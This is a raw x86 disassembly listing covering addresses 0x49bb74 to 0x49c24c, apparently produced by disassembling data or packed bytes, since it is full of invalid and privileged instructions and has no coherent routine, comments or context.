  49bb74:	ror    dl,cl
  49bb76:	or     al,0xc9
  49bb78:	cmp    BYTE PTR [edx],dh
  49bb7a:	xlat   BYTE PTR ds:[ebx]
  49bb7b:	xor    BYTE PTR [edx-0x209eb14c],ch
  49bb81:	das    
  49bb82:	adc    cl,BYTE PTR [ebx]
  49bb84:	in     al,dx
  49bb85:	les    edi,FWORD PTR [edi]
  49bb87:	cs ins DWORD PTR es:[edi],dx
  49bb89:	test   DWORD PTR [edx],ebx
  49bb8b:	in     al,0xee
  49bb8d:	xor    esi,DWORD PTR [edi]
  49bb8f:	iret   
  49bb90:	addr16 xchg esp,eax
  49bb92:	(bad)  [eax+0x7f0f4fb9]
  49bb98:	(bad)  [eax]
  49bb9a:	(bad)  
  49bb9b:	mov    ch,0x8a
  49bb9d:	jg     0x49bb8e
  49bb9f:	xor    eax,0x37aa6283
  49bba4:	xor    dl,BYTE PTR [ebx-0x5fc8cd31]
  49bbaa:	adc    al,0x95
  49bbac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49bbad:	xor    al,0xcf
  49bbaf:	das    
  49bbb0:	xchg   ecx,eax
  49bbb1:	push   0x2f8fd333
  49bbb6:	inc    ebp
  49bbb7:	xchg   edx,eax
  49bbb8:	cmp    al,0xc9
  49bbba:	sub    DWORD PTR [ebx+0x789d37fe],esi
  49bbc0:	retf   
  49bbc1:	daa    
  49bbc2:	out    dx,al
  49bbc3:	inc    esi
  49bbc4:	or     ebp,DWORD PTR [edi+0x74aa51c0]
  49bbca:	inc    esi
  49bbcb:	scas   eax,DWORD PTR es:[edi]
  49bbcc:	jg     0x49bb58
  49bbce:	mov    ah,0xf8
  49bbd0:	and    BYTE PTR [edi+0x3e656572],bl
  49bbd6:	iret   
  49bbd7:	jb     0x49bc26
  49bbd9:	fst    QWORD PTR ds:[edx-0x11]
  49bbdd:	xor    bh,BYTE PTR [edi-0x7a1a51c8]
  49bbe3:	pop    ds
  49bbe4:	xor    al,0xbf
  49bbe6:	xor    dh,BYTE PTR [ecx-0x10]
  49bbe9:	push   edx
  49bbea:	ins    BYTE PTR es:[edi],dx
  49bbeb:	setg   BYTE PTR [edi]
  49bbee:	jae    0x49bbb3
  49bbf0:	xchg   edx,eax
  49bbf1:	inc    edi
  49bbf2:	push   cs
  49bbf3:	ss ss inc edx
  49bbf6:	add    BYTE PTR [ebx+0x6b],al
  49bbf9:	mov    ebx,es
  49bbfb:	sar    DWORD PTR ss:[edi+0x39],1
  49bbff:	dec    edi
  49bc00:	push   cs
  49bc01:	fisttp DWORD PTR [ecx-0x51]
  49bc04:	inc    esp
  49bc05:	(bad)  
  49bc06:	outs   dx,DWORD PTR ds:[esi]
  49bc07:	inc    ecx
  49bc08:	xor    al,0xf
  49bc0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49bc0b:	in     eax,0x43
  49bc0d:	push   ds
  49bc0e:	dec    DWORD PTR [esi-0x7e9dcbe]
  49bc14:	cmp    al,dl
  49bc16:	and    ebx,DWORD PTR [edi-0x1cd53e46]
  49bc1c:	mov    edx,0xf39331ef
  49bc21:	fsubr  DWORD PTR [ecx+ebp*1]
  49bc24:	sar    DWORD PTR [edi],cl
  49bc26:	retf   
  49bc27:	pop    ebp
  49bc28:	dec    edi
  49bc29:	mov    edx,0x3f36c3cb
  49bc2e:	iret   
  49bc2f:	push   edi
  49bc30:	pop    eax
  49bc31:	and    DWORD PTR [ebp-0x3b068009],esp
  49bc37:	in     al,0xaa
  49bc39:	inc    esi
  49bc3a:	dec    edi
  49bc3b:	inc    esi
  49bc3c:	mov    dh,0x31
  49bc3e:	xchg   DWORD PTR [ebx],ebp
  49bc40:	pop    esp
  49bc41:	arpl   WORD PTR [ebx+0x6837ff8f],sp
  49bc47:	(bad)  
  49bc48:	leave  
  49bc49:	inc    esp
  49bc4a:	aaa    
  49bc4b:	outs   dx,DWORD PTR ds:[esi]
  49bc4c:	out    dx,eax
  49bc4d:	inc    esi
  49bc4e:	push   eax
  49bc4f:	(bad)  
  49bc50:	ror    BYTE PTR [ebp-0x51],0x44
  49bc54:	dec    edi
  49bc55:	shl    BYTE PTR [esi-0x4f],0x13
  49bc59:	push   edi
  49bc5a:	inc    ebx
  49bc5b:	call   FWORD PTR [esi-0x2814e60f]
  49bc61:	xchg   esi,eax
  49bc62:	inc    esp
  49bc63:	gs xchg ebp,eax
  49bc65:	cmp    ch,BYTE PTR [eax+ebx*2+0x44c74792]
  49bc6c:	mov    cl,0xae
  49bc6e:	inc    ebx
  49bc6f:	dec    esi
  49bc70:	inc    ebp
  49bc71:	cmp    DWORD PTR [edi],eax
  49bc73:	sub    al,0x23
  49bc75:	(bad)  
  49bc76:	dec    eax
  49bc77:	push   edi
  49bc78:	pop    esi
  49bc79:	cmp    DWORD PTR [eax],edi
  49bc7b:	xor    edx,esi
  49bc7d:	jo     0x49bca7
  49bc7f:	pop    edi
  49bc80:	out    0xf7,eax
  49bc82:	xchg   ebp,eax
  49bc83:	cmp    BYTE PTR [esi],0x16
  49bc86:	out    dx,eax
  49bc87:	fisttp DWORD PTR ds:0x770a4f0b
  49bc8d:	imul   edx,DWORD PTR [esi],0xffffff89
  49bc90:	sar    DWORD PTR [edi-0xd6e7b45],0x1
  49bc97:	ja     0x49bccf
  49bc99:	mov    esp,DWORD PTR [edx]
  49bc9b:	and    edx,DWORD PTR [edi]
  49bc9d:	mov    eax,0x4230a6d7
  49bca2:	mov    esp,0x203bc0f
  49bca7:	pop    edi
  49bca8:	fstp   TBYTE PTR [ebx+0x4fca77c9]
  49bcae:	xchg   edi,eax
  49bcaf:	inc    edx
  49bcb0:	sbb    cl,BYTE PTR [edi]
  49bcb2:	xor    ch,BYTE PTR [ebp+0x44d49529]
  49bcb8:	xchg   edi,eax
  49bcb9:	ja     0x49bc95
  49bcbb:	xchg   esi,eax
  49bcbc:	inc    ebx
  49bcbd:	sbb    al,0x33
  49bcbf:	push   ds
  49bcc0:	inc    edx
  49bcc1:	mul    ebp
  49bcc3:	mov    ds:0x30f68722,eax
  49bcc8:	push   edi
  49bcc9:	cmp    DWORD PTR [eax+0xfa92edc],ebx
  49bccf:	mov    edi,0xb65c5637
  49bcd4:	pop    edx
  49bcd5:	sbb    ecx,DWORD PTR [edi-0x3e]
  49bcd8:	addr16 xchg ecx,eax
  49bcda:	inc    edi
  49bcdb:	in     eax,dx
  49bcdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49bcdd:	mov    ds:0x56333186,eax
  49bce2:	mov    DWORD PTR [ecx+0x7b474341],edx
  49bce8:	nop
  49bce9:	arpl   dx,dx
  49bceb:	mov    edi,0x7265764f
  49bcf0:	data16 ins BYTE PTR es:[edi],dx
  49bcf2:	outs   dx,DWORD PTR ds:[esi]
  49bcf3:	ja     0x49bd14
  49bcf5:	cmp    DWORD PTR [eax+0x7e91ef93],eax
  49bcfb:	wrmsr  
  49bcfd:	xor    eax,0x29919348
  49bd02:	iret   
  49bd03:	inc    esi
  49bd04:	xor    BYTE PTR [ecx],ah
  49bd06:	push   ds
  49bd07:	adc    BYTE PTR [ecx+0x673346cf],bl
  49bd0d:	xchg   edi,eax
  49bd0e:	push   ss
  49bd0f:	pop    ebx
  49bd10:	aam    0x9f
  49bd12:	sahf   
  49bd13:	loopne 0x49bd28
  49bd15:	mov    ecx,eax
  49bd17:	ss push es
  49bd19:	out    dx,eax
  49bd1a:	pop    eax
  49bd1b:	add    eax,0x9fff3c24
  49bd20:	add    eax,0xcf530a85
  49bd25:	lods   eax,DWORD PTR ds:[esi]
  49bd26:	or     DWORD PTR [eax+0x44df83b8],esi
  49bd2c:	sub    al,0xcd
  49bd2e:	and    dl,dh
  49bd30:	out    dx,eax
  49bd31:	(bad)  
  49bd32:	ucomiss xmm5,xmm6
  49bd35:	mov    cl,cl
  49bd37:	xor    al,dh
  49bd39:	push   cs
  49bd3a:	sbb    ecx,DWORD PTR [ebp+0x5a]
  49bd3d:	add    esi,eax
  49bd3f:	aas    
  49bd40:	iret   
  49bd41:	aas    
  49bd42:	ins    BYTE PTR es:[edi],dx
  49bd43:	sub    edx,eax
  49bd45:	xchg   bh,ah
  49bd47:	xlat   BYTE PTR ds:[ebx]
  49bd48:	add    edx,DWORD PTR [esi]
  49bd4a:	sbb    eax,ebx
  49bd4c:	and    BYTE PTR [edi-0x79],cl
  49bd4f:	mov    ch,0x18
  49bd51:	out    0xae,eax
  49bd53:	fwait
  49bd54:	pslld  mm5,QWORD PTR [edi-0x3e363630]
  49bd5b:	pop    DWORD PTR [edx+0x45]
  49bd5e:	xor    eax,0x264d0264
  49bd63:	mov    DWORD PTR [ebp-0x29],0x8e9d3144
  49bd6a:	sbb    BYTE PTR [ebx-0x71],al
  49bd6d:	xor    al,0x7f
  49bd6f:	sub    al,0xab
  49bd71:	jne    0x49bdd4
  49bd73:	daa    
  49bd74:	outs   dx,DWORD PTR ds:[esi]
  49bd75:	inc    ebx
  49bd76:	push   ds
  49bd77:	or     eax,0x57eaef56
  49bd7c:	cmp    DWORD PTR [ebp+ebx*2-0x46],edi
  49bd80:	test   eax,0x462fc332
  49bd85:	rdpmc  
  49bd87:	mov    ah,0x12
  49bd89:	mov    al,0x9a
  49bd8b:	dec    ebx
  49bd8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49bd8d:	cs je  0x49bd56
  49bd90:	sub    dh,BYTE PTR [edi-0x2e]
  49bd93:	inc    bx
  49bd95:	(bad)  
  49bd96:	imul   eax,DWORD PTR [esi+eax*2+0x38],0xffffffcb
  49bd9b:	rdpmc  
  49bd9d:	adc    ah,BYTE PTR [edi-0x6e681058]
  49bda3:	or     DWORD PTR [ebx+eiz*2+0x4c366fc7],esi
  49bdaa:	mov    ah,0xdd
  49bdac:	push   es
  49bdad:	cs das 
  49bdaf:	inc    ecx
  49bdb0:	seta   BYTE PTR [ecx-0xc]
  49bdb4:	loopne 0x49bddc
  49bdb6:	xchg   DWORD PTR [edi+edx*4],esi
  49bdb9:	ja     0x49bdf8
  49bdbb:	xor    al,0x39
  49bdbd:	jns    0x49be26
  49bdbf:	cmp    BYTE PTR [ebp+0x42],al
  49bdc2:	xchg   esp,eax
  49bdc3:	nop
  49bdc4:	es loopne 0x49bd76
  49bdc7:	mov    esi,0xa7f92d36
  49bdcc:	push   cs
  49bdcd:	pop    ss
  49bdce:	rdmsr  
  49bdd0:	add    BYTE PTR [ebp+0x5],al
  49bdd3:	push   esi
  49bdd4:	sub    al,0x3
  49bdd6:	stos   DWORD PTR es:[edi],eax
  49bdd7:	mov    edi,0x8aeb11ae
  49bddc:	sub    DWORD PTR [edi],0x26b78f35
  49bde2:	xor    esi,DWORD PTR [ebx]
  49bde4:	xor    BYTE PTR [edi],ch
  49bde6:	cmp    DWORD PTR [edi-0x6c],eax
  49bde9:	sbb    BYTE PTR [eax],ch
  49bdeb:	jo     0x49be33
  49bded:	pop    edi
  49bdee:	aaa    
  49bdef:	pop    edi
  49bdf0:	push   ds
  49bdf1:	nop
  49bdf2:	or     BYTE PTR [edi+0x32],0x56
  49bdf6:	arpl   WORD PTR gs:[edi],sp
  49bdf9:	das    
  49bdfa:	sbb    DWORD PTR [ecx],ebx
  49bdfc:	mov    ecx,0x3135be02
  49be01:	inc    edx
  49be02:	(bad)  
  49be03:	in     al,0x8e
  49be05:	or     DWORD PTR [eax],esi
  49be07:	push   DWORD PTR [esi]
  49be09:	xchg   BYTE PTR [ecx],dh
  49be0b:	jmp    0x45f98c84
  49be10:	pop    edx
  49be11:	push   ds
  49be12:	push   0x39f727c4
  49be17:	xor    DWORD PTR [eax-0x103c38f0],esi
  49be1d:	pmulhuw mm6,QWORD PTR [esi+0x25]
  49be21:	push   edx
  49be22:	scas   eax,DWORD PTR es:[edi]
  49be23:	xor    eax,0x2a6300f
  49be28:	scas   al,BYTE PTR es:[edi]
  49be29:	sar    BYTE PTR [edi-0x64ce90ca],0xae
  49be30:	push   esp
  49be31:	inc    edx
  49be32:	out    dx,eax
  49be33:	xor    cl,BYTE PTR [edi-0x6f46c6c8]
  49be39:	inc    esp
  49be3a:	xor    eax,DWORD PTR [ebp+0x39]
  49be3d:	ins    DWORD PTR es:[edi],dx
  49be3e:	add    DWORD PTR [ecx-0x624660f0],ecx
  49be44:	int3   
  49be45:	push   esi
  49be46:	out    dx,eax
  49be47:	iret   
  49be48:	aaa    
  49be49:	aaa    
  49be4a:	push   DWORD PTR [esi]
  49be4c:	cmp    DWORD PTR ss:[ecx],edi
  49be4f:	cmp    DWORD PTR [esi],esi
  49be51:	ss xor eax,0xd277490f
  49be57:	fs xor ch,dl
  49be5a:	(bad)  
  49be5d:	or     DWORD PTR [ecx-0x59],0x393e44cf
  49be64:	pop    ebx
  49be65:	push   ebx
  49be66:	fs inc edx
  49be68:	inc    esi
  49be69:	dec    edi
  49be6a:	dec    edi
  49be6b:	enter  0x2fc8,0x60
  49be6f:	fistp  QWORD PTR [eax]
  49be71:	xor    BYTE PTR [edx+0x4d],ah
  49be74:	enter  0x39c8,0x33
  49be78:	ss (bad) 
  49be7a:	mov    cl,0x26
  49be7c:	fs fs inc esi
  49be7f:	cmp    DWORD PTR [ebx+0x7f],eax
  49be82:	mov    al,ds:0x35136e4e
  49be87:	wrmsr  
  49be89:	inc    edx
  49be8a:	xor    dl,BYTE PTR [ecx]
  49be8c:	outs   dx,BYTE PTR ds:[esi]
  49be8d:	stos   DWORD PTR es:[edi],eax
  49be8e:	scas   eax,DWORD PTR es:[edi]
  49be8f:	lahf   
  49be90:	inc    esi
  49be91:	xchg   edi,eax
  49be92:	inc    esi
  49be93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49be94:	rcl    BYTE PTR ds:0x97414f2b,1
  49be9a:	ss pop ebx
  49be9c:	scas   al,BYTE PTR es:[edi]
  49be9d:	mov    ch,0x4d
  49be9f:	(bad)  
  49bea1:	inc    ebp
  49bea2:	pop    edi
  49bea3:	jl     0x49beac
  49bea5:	outs   dx,BYTE PTR ds:[esi]
  49bea6:	jb     0x49bedc
  49bea8:	aaa    
  49bea9:	fisttp WORD PTR [edi]
  49beab:	cmp    DWORD PTR [esi],ebp
  49bead:	pusha  
  49beae:	push   eax
  49beaf:	loope  0x49bf20
  49beb1:	out    dx,eax
  49beb2:	sbb    BYTE PTR [edx+0x444e2c6f],dl
  49beb8:	xor    DWORD PTR [esi-0x28],eax
  49bebb:	or     DWORD PTR [edi+ebp*1],ebp
  49bebe:	lahf   
  49bebf:	repnz adc ebp,DWORD PTR [ebx]
  49bec2:	or     BYTE PTR [ecx-0x3890cdb1],0x88
  49bec9:	je     0x49beb4
  49becb:	inc    edi
  49becc:	out    dx,al
  49becd:	xor    DWORD PTR [esi-0x37b4a7cc],ecx
  49bed3:	and    edi,DWORD PTR [ecx]
  49bed5:	add    BYTE PTR [ecx],dh
  49bed7:	pop    ds
  49bed8:	leave  
  49bed9:	adc    DWORD PTR [edx],0xffffffd7
  49bedc:	fwait
  49bedd:	aas    
  49bede:	push   esi
  49bedf:	popa   
  49bee0:	arpl   dx,dx
  49bee2:	inc    ebx
  49bee3:	mov    bh,0xaf
  49bee5:	cmp    DWORD PTR [edi+0x232c4538],ebp
  49beeb:	jae    0x49bf1c
  49beed:	inc    edx
  49beee:	aaa    
  49beef:	es cwde 
  49bef1:	fdivr  st(5),st
  49bef3:	das    
  49bef4:	dec    edi
  49bef5:	xor    DWORD PTR [edi],ebp
  49bef7:	xor    bh,BYTE PTR [esi]
  49bef9:	xor    cl,bh
  49befb:	dec    esi
  49befc:	xor    DWORD PTR [edi],ecx
  49befe:	ss pop ebx
  49bf00:	and    eax,0x46e84953
  49bf05:	mov    edi,0xdb02f330
  49bf0a:	and    bh,BYTE PTR [esi+0x7c429f97]
  49bf10:	add    ecx,DWORD PTR [edx+edi*1+0xf]
  49bf14:	mov    cl,BYTE PTR ss:[edi]
  49bf17:	aaa    
  49bf18:	add    ch,al
  49bf1a:	add    BYTE PTR [edx+0x782d07c7],bl
  49bf20:	add    al,0x30
  49bf22:	lahf   
  49bf23:	daa    
  49bf24:	mov    ebp,edx
  49bf26:	inc    edx
  49bf27:	lods   al,BYTE PTR ds:[esi]
  49bf28:	call   DWORD PTR [edi+0x1047555a]
  49bf2e:	(bad)  
  49bf2f:	dec    edi
  49bf30:	push   ebx
  49bf31:	lahf   
  49bf32:	inc    edi
  49bf33:	xor    dl,BYTE PTR [esi-0x74]
  49bf36:	dec    edi
  49bf37:	mov    ds:0x1c84badd,eax
  49bf3c:	pop    ds
  49bf3d:	das    
  49bf3e:	sub    dl,ah
  49bf40:	sub    ah,BYTE PTR [ecx-0xe]
  49bf43:	rdpmc  
  49bf45:	mul    DWORD PTR [esi-0x2e]
  49bf48:	adc    DWORD PTR [ecx+0x414f4373],ebx
  49bf4e:	adc    BYTE PTR [ecx+0x351f5012],bh
  49bf54:	dec    esi
  49bf55:	cs js  0x49bfa0
  49bf58:	or     ebx,DWORD PTR [edi]
  49bf5a:	lahf   
  49bf5b:	inc    ebp
  49bf5c:	inc    edx
  49bf5d:	push   edx
  49bf5e:	jp     0x49bfb4
  49bf60:	pop    eax
  49bf61:	jmp    FWORD PTR [esi+0x64]
  49bf64:	pop    esp
  49bf65:	mov    eax,0xafa7ac2e
  49bf6a:	cmp    DWORD PTR [edi+0x311d26dd],ecx
  49bf70:	xor    BYTE PTR [edi],bh
  49bf72:	inc    esi
  49bf73:	cmovbe eax,DWORD PTR [ecx+0x1e]
  49bf77:	xchg   ecx,eax
  49bf78:	call   0x369866e0
  49bf7d:	rol    DWORD PTR [edx-0x47],0x18
  49bf81:	aaa    
  49bf82:	xor    esp,DWORD PTR [edx]
  49bf84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49bf85:	jns    0x49bf0b
  49bf87:	shl    DWORD PTR [edx+0x45],cl
  49bf8a:	ret    
  49bf8b:	pop    esi
  49bf8c:	inc    ebp
  49bf8d:	fdiv   QWORD PTR [ebx]
  49bf8f:	(bad)  
  49bf90:	xor    BYTE PTR [edi],ah
  49bf92:	inc    edi
  49bf93:	mov    bl,0xd
  49bf95:	xor    cl,bh
  49bf97:	scas   al,BYTE PTR es:[edi]
  49bf98:	ja     0x49bfa9
  49bf9a:	xor    ah,BYTE PTR [edx+0x30]
  49bf9d:	and    ebx,DWORD PTR [edi+0x39970fb1]
  49bfa3:	inc    ebp
  49bfa4:	in     eax,0xa0
  49bfa6:	sbb    al,0xcc
  49bfa8:	ja     0x49bfdf
  49bfaa:	xor    ebx,DWORD PTR [eax-0xe]
  49bfad:	or     BYTE PTR [ebx],ch
  49bfaf:	outs   dx,DWORD PTR ds:[esi]
  49bfb0:	aaa    
  49bfb1:	inc    ebx
  49bfb2:	lods   al,BYTE PTR ds:[esi]
  49bfb3:	imul   edi,ecx,0x1e
  49bfb6:	bound  ecx,QWORD PTR [edi]
  49bfb8:	xor    eax,0xbc0fa977
  49bfbd:	inc    ebx
  49bfbe:	inc    edi
  49bfbf:	sub    esi,DWORD PTR [edi+0xa]
  49bfc2:	ror    DWORD PTR [ebx+ebx*8+0x360726df],cl
  49bfc9:	and    ah,BYTE PTR [ebx]
  49bfcb:	and    edx,DWORD PTR [ebx]
  49bfcd:	idiv   DWORD PTR [ecx]
  49bfcf:	xor    al,BYTE PTR [ecx+0x55]
  49bfd2:	add    ch,BYTE PTR [ebx+0x67f7631e]
  49bfd8:	ja     0x49bf74
  49bfda:	jl     0x49bf67
  49bfdc:	or     BYTE PTR [edi],0x35
  49bfdf:	adc    cl,BYTE PTR [edi]
  49bfe1:	retf   0x5983
  49bfe4:	stos   DWORD PTR es:[edi],eax
  49bfe5:	dec    edx
  49bfe6:	ja     0x49c01c
  49bfe8:	add    BYTE PTR [ebx],cl
  49bfea:	and    al,0xe4
  49bfec:	add    DWORD PTR [esi],ecx
  49bfee:	inc    esi
  49bfef:	imul   DWORD PTR [ebx]
  49bff1:	mov    ah,0x69
  49bff3:	mov    ch,BYTE PTR [edi-0x7430a0bd]
  49bff9:	into   
  49bffa:	jne    0x49bffd
  49bffc:	push   DWORD PTR [edx]
  49bffe:	mov    edi,cr7
  49c001:	add    al,0x96
  49c003:	inc    edx
  49c004:	fild   WORD PTR [esi+0x0]
  49c007:	aaa    
  49c008:	rol    ah,1
  49c00a:	and    esi,DWORD PTR [edx]
  49c00c:	xor    DWORD PTR [esi+0x74ae8523],ecx
  49c012:	dec    DWORD PTR [edi+0x158b9142]
  49c018:	nop
  49c019:	xor    dl,BYTE PTR [edi-0x669fd4ce]
  49c01f:	cdq    
  49c020:	xor    al,0xf
  49c022:	inc    ecx
  49c023:	das    
  49c024:	pop    ds
  49c025:	pop    eax
  49c026:	jb     0x49bfd4
  49c028:	cmp    WORD PTR [edi+0x48b1d895],dx
  49c02f:	outs   dx,DWORD PTR ds:[esi]
  49c030:	daa    
  49c031:	lahf   
  49c032:	push   cs
  49c033:	hlt    
  49c034:	sub    BYTE PTR [edx-0x2d],ch
  49c037:	sahf   
  49c038:	xor    eax,0x4065a380
  49c03d:	inc    edx
  49c03e:	mov    edi,0xf232129c
  49c043:	ds xor al,0x39
  49c046:	fidiv  DWORD PTR [edi-0xe]
  49c049:	(bad)  
  49c04a:	and    DWORD PTR [edi+0xf3437ce],ebx
  49c050:	or     DWORD PTR [edi+0x6f],eax
  49c053:	enter  0xff30,0xc7
  49c057:	mov    al,0xa
  49c059:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49c05a:	xor    eax,0xbb2f02bf
  49c05f:	mov    cl,0xb8
  49c061:	or     BYTE PTR [edi-0x978d390],dl
  49c067:	dec    edx
  49c068:	mov    eax,ds:0xa2c7021e
  49c06d:	push   fs
  49c06f:	push   ebp
  49c070:	aaa    
  49c071:	fsub   QWORD PTR [edx+0x27]
  49c074:	xor    BYTE PTR [edi-0x7d],dl
  49c077:	xor    dh,BYTE PTR [edx]
  49c079:	jb     0x49c019
  49c07b:	xor    eax,DWORD PTR [ebx+0x41]
  49c07e:	pop    es
  49c07f:	dec    ebx
  49c080:	test   BYTE PTR [esi+ebp*1+0x540be70e],dl
  49c087:	xchg   edx,eax
  49c088:	xchg   edi,eax
  49c089:	dec    edx
  49c08a:	mov    DWORD PTR [esi-0x46],0x274d6e42
  49c091:	iret   
  49c092:	add    esi,DWORD PTR [esi]
  49c094:	outs   dx,DWORD PTR ds:[esi]
  49c095:	xor    esi,ebx
  49c097:	loopne 0x49c0a0
  49c099:	sub    eax,DWORD PTR [ebx+0x13]
  49c09c:	retf   
  49c09d:	leave  
  49c09e:	scas   eax,DWORD PTR es:[edi]
  49c09f:	xchg   ebx,eax
  49c0a0:	xor    BYTE PTR [esi+0x27],al
  49c0a3:	xor    al,BYTE PTR [esi+0x6d]
  49c0a6:	nop
  49c0a7:	lods   eax,DWORD PTR ds:[esi]
  49c0a8:	add    DWORD PTR [edi],edx
  49c0aa:	arpl   WORD PTR [esi+0x556a5c0f],bx
  49c0b0:	shl    BYTE PTR [ecx],0x4f
  49c0b3:	ja     0x49c0a5
  49c0b5:	test   DWORD PTR [edi+0x763174a],esi
  49c0bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49c0bc:	retf   0xe30
  49c0bf:	daa    
  49c0c0:	add    ecx,0x3b
  49c0c3:	(bad)
  49c0c8:	paddd  mm5,mm5
  49c0cb:	push   ss
  49c0cc:	mov    esp,0x636f34c9
  49c0d1:	dec    edx
  49c0d2:	das    
  49c0d3:	lods   al,BYTE PTR ds:[esi]
  49c0d4:	sbb    BYTE PTR [edi+0x4747d6b8],dl
  49c0da:	or     al,0xd8
  49c0dc:	mov    BYTE PTR [ebx+0x43],ch
  49c0df:	and    edx,DWORD PTR [edi+0x4c6e90eb]
  49c0e5:	cmp    DWORD PTR [edi+0x727076ba],esp
  49c0eb:	repnz pop edi
  49c0ed:	cmp    DWORD PTR [edx+eax*2+0x73],eax
  49c0f1:	scas   eax,DWORD PTR es:[edi]
  49c0f2:	mov    ah,0x43
  49c0f4:	pop    eax
  49c0f5:	push   ebp
  49c0f6:	push   DWORD PTR [edi+0x719e4198]
  49c0fc:	out    0xb6,eax
  49c0fe:	inc    ebx
  49c0ff:	cmp    DWORD PTR [edx+0x6741577c],ebx
  49c105:	inc    esp
  49c106:	(bad)  
  49c108:	mov    edx,0x6b587d66
  49c10d:	push   edi
  49c10e:	xor    DWORD PTR [esi+eax*1-0x1e],esp
  49c112:	loopne 0x49c143
  49c114:	xor    DWORD PTR [edi],esi
  49c116:	inc    edx
  49c117:	data16 and BYTE PTR [esi+0x26],al
  49c11b:	inc    esi
  49c11c:	cmp    DWORD PTR [edi+0x31],eax
  49c11f:	or     eax,0x3425382
  49c124:	mov    bh,0xe
  49c126:	shr    DWORD PTR [eax],0x72
  49c129:	xor    ah,BYTE PTR [ebx]
  49c12b:	pop    ss
  49c12c:	push   esi
  49c12d:	imul   ebp,ebp,0xcf9f38ba
  49c133:	icebp  
  49c134:	je     0x49c128
  49c136:	int    0xff
  49c138:	cmp    DWORD PTR [edi],ecx
  49c13a:	xor    BYTE PTR [ecx-0x65],al
  49c13d:	repnz push esi
  49c13f:	xor    eax,0x4f
  49c142:	pop    ss
  49c143:	push   ds
  49c144:	ss movs BYTE PTR es:[edi],BYTE PTR es:[esi]
  49c147:	xchg   DWORD PTR [eax+0x35],esi
  49c14a:	daa    
  49c14b:	cmp    DWORD PTR [ebp+0x5e],eax
  49c14e:	mov    fs,WORD PTR [ebx]
  49c150:	inc    ebp
  49c151:	idiv   DWORD PTR [ebx+0x6f]
  49c154:	shr    BYTE PTR [ebx-0x66],0xdc
  49c158:	rdpmc  
  49c15a:	inc    edi
  49c15b:	push   edx
  49c15c:	cmp    bh,dl
  49c15e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49c15f:	je     0x49c124
  49c161:	fistp  QWORD PTR [edi+0x41]
  49c164:	pop    eax
  49c165:	dec    ebp
  49c166:	dec    esi
  49c167:	outs   dx,BYTE PTR ds:[esi]
  49c168:	sysexit 
  49c16a:	xor    BYTE PTR [edi+0x40723213],ch
  49c170:	cs xor DWORD PTR ss:[edi],esi
  49c174:	mov    BYTE PTR [edi+0x3f3e223d],dh
  49c17a:	out    0x2e,eax
  49c17c:	xor    BYTE PTR [ecx+0x43d7de61],bh
  49c182:	ja     0x49c168
  49c184:	adc    ch,bl
  49c186:	and    BYTE PTR [edi],bh
  49c188:	into   
  49c189:	inc    esi
  49c18a:	dec    esp
  49c18b:	mov    WORD PTR ds:0x462f1fc2,es
  49c191:	cli    
  49c192:	pop    edx
  49c193:	pop    esp
  49c194:	xor    DWORD PTR [ebx],0x1f
  49c197:	jg     0x49c163
  49c199:	and    BYTE PTR [edi],bl
  49c19b:	mov    edx,0x34439ea3
  49c1a0:	xchg   ecx,eax
  49c1a1:	xchg   ecx,eax
  49c1a2:	addr16 fs (bad) 
  49c1a5:	pop    esi
  49c1a6:	xor    esi,DWORD PTR [edx]
  49c1a8:	sbb    DWORD PTR [eax],0xce2f1ae0
  49c1ae:	xchg   BYTE PTR [eax],bl
  49c1b0:	mov    DWORD PTR [ecx+0x4653382f],ecx
  49c1b6:	and    al,0xe4
  49c1b8:	or     bl,al
  49c1ba:	mov    edi,0xf29645e6
  49c1bf:	push   edx
  49c1c0:	and    esi,DWORD PTR [edx-0x7f07c871]
  49c1c6:	pop    esp
  49c1c7:	pop    edi
  49c1c8:	xchg   ebx,eax
  49c1c9:	out    0xbf,eax
  49c1cb:	xor    ch,BYTE PTR [esi+0x4f41ac0f]
  49c1d1:	mov    edi,0xb11ad497
  49c1d6:	jecxz  0x49c21c
  49c1d8:	(bad)  
  49c1d9:	out    dx,eax
  49c1da:	xchg   edx,eax
  49c1db:	add    esp,eax
  49c1dd:	leave  
  49c1de:	lahf   
  49c1df:	outs   dx,BYTE PTR ds:[esi]
  49c1e0:	inc    ebx
  49c1e1:	or     esi,DWORD PTR [edi+0x2f33c7d9]
  49c1e7:	aaa    
  49c1e8:	pop    ds
  49c1e9:	xor    eax,0xb015a479
  49c1ee:	sub    DWORD PTR [edi+0x45003136],0xffffff81
  49c1f5:	enter  0x2563,0x6f
  49c1f9:	xor    BYTE PTR [ecx],ah
  49c1fb:	loope  0x49c22a
  49c1fd:	add    dl,bl
  49c1ff:	seto   BYTE PTR [edi+0x22]
  49c203:	inc    ebp
  49c204:	(bad)  
  49c205:	out    dx,al
  49c206:	xor    eax,0x901e13d5
  49c20b:	test   DWORD PTR [edi-0x3db29709],0x5c1bef5b
  49c215:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49c216:	nop
  49c217:	cmp    eax,0x45efcf9b
  49c21c:	mov    ah,ch
  49c21e:	in     al,0x2
  49c220:	mov    DWORD PTR [ecx+0x44],0xad732df
  49c227:	pop    esi
  49c228:	xor    eax,DWORD PTR [edi]
  49c22a:	aaa    
  49c22b:	inc    ebx
  49c22c:	push   es
  49c22d:	jns    0x49c1c3
  49c22f:	xlat   BYTE PTR ds:[ebx]
  49c230:	adc    esp,esi
  49c232:	inc    esp
  49c233:	inc    ebp
  49c234:	inc    esi
  49c235:	ins    DWORD PTR es:[edi],dx
  49c236:	cmp    al,BYTE PTR [ebp+0x4a]
  49c239:	daa    
  49c23a:	mov    bh,0xa3
  49c23c:	aad    0xd0
  49c23e:	xlat   BYTE PTR ds:[ebx]
  49c23f:	aaa    
  49c240:	mov    bl,0x43
  49c242:	inc    esi
  49c243:	cs icebp 
  49c245:	test   bh,bh
  49c247:	mov    es,WORD PTR [ecx+0x38]
  49c24a:	sahf   
  49c24b:	push   ds
  49c24c:	or     BYTE PTR [ebx+eax*2+0x57],al
